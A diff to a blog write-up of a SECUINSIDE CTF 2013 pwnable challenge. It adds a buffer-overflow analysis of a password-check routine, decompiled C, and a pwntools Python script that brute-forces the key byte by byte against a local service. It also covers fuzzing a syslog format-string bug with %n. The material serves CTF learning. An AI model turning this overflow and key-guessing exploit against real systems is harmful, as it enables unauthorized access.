@@ -4,7 +4,7 @@ date = "2024-07-19"
 description = "SECUINSIDE CTF 2013 pwnable challenge"
 
 [taxonomies]
-tags = ["ctf", "pwnable", "info leak", "fsb", "syslog"]
+tags = ["ctf", "pwnable", "bof", "byte by byte attack", "fsb", "syslog"]
 +++
 
 ## 0x00. Introduction
@@ -19,7 +19,7 @@ tags = ["ctf", "pwnable", "info leak", "fsb", "syslog"]
 
 
 ## 0x01. Vulnerability
-### Info Leak
+### Buffer Overflow
 ``` c
 int main()
 {
@@ -60,9 +60,7 @@ int read_password_8048A7D()
 }
 ```
 
-Looking at `read_password_8048A7D()`, although we can manipulate the value of the local variable `password` by reading 40 bytes in `read()`, it's meaningless because `lock()` and `unlock()` compare with the value of the global variable `password_804A0A4`.
-
-However, another attack is possible: if we leave the last byte of `password` and overwrite the front part with the same value as `buf`, we can brute force byte by byte.
+At this point, it reads 40 bytes to a 20 bytes buffer `buf`, allowing us to overwrite local variable `password`.
 
 ### FSB in `syslog`
 ``` c
@@ -101,7 +99,62 @@ Fortunately, we can pass a format string to `fmt_0804A0C0` through `name_804A2C0
 
 
 ## 0x02. Exploit
-Normally, to use FSB, I would construct the payload like `%p %p %p %p ...` to check which format string index corresponds to the part pointed to by `$esp`.
+### Info Leak
+``` c
+int read_password_8048A7D()
+{
+  FILE *fd; // [esp+10h] [ebp-38h]
+  char buf[20]; // [esp+14h] [ebp-34h] BYREF
+  char password[20]; // [esp+28h] [ebp-20h] BYREF
+  int canary; // [esp+3c] [ebp-c]
+
+  *&password[20] = __readgsdword(0x14u);
+  fd = fopen("password", "rb");
+  fread(password, 1u, 0x10u, fd);
+  fclose(fd);
+  *password_804A0A4 = *password;
+  *&password_804A0A4[4] = *&password[4];
+  *&password_804A0A4[8] = *&password[8];
+  *&password_804A0A4[12] = *&password[12];
+  printf("Input master key > ");
+  read(0, buf, 40u);
+  return memcmp(password, buf, 16u);
+}
+```
+
+Looking at `read_password_8048A7D()` again, although we can manipulate the value of the local variable `password` by reading 40 bytes in `read()`, it's meaningless because `lock()` and `unlock()` compare with the value of the global variable `password_804A0A4`.
+
+However, another attack is possible: if we leave the last byte of `password` and overwrite the front part with the same value as `buf`, we can brute force byte by byte.
+
+So I wrote the payload as follows.
+
+``` python
+def guess_key(s):
+    key = []
+    for i in range(16):
+        for j in range(256):
+            s = remote("0.0.0.0", 8107)
+            floor_and_room(s, 1, 2)
+            payload = b"A" * (16 - len(key) - 1)
+            payload += chr(j).encode()
+            payload += ''.join(key).encode()
+            payload += b"B" * 4
+            payload += b"A" * (16 - len(key) - 1)
+            s.send(payload)
+            try:
+                if s.recv():
+                    key.insert(0, chr(j))
+                    log.success(f"HIT : {key}")
+                    s.close()
+                    break
+            except:
+                s.close()
+                continue
+    return key
+```
+
+### FSB
+Normally, to utilize FSB, I would construct the payload like `%p %p %p %p ...` to check which format string index corresponds to the part pointed to by `$esp`.
 But since `syslog()` only logs to `/var/log/syslog`, I couldn't check the results.
 Eventually, I manually fuzzed when and where values were written by increasing the `?` value in `%?$n`.
 
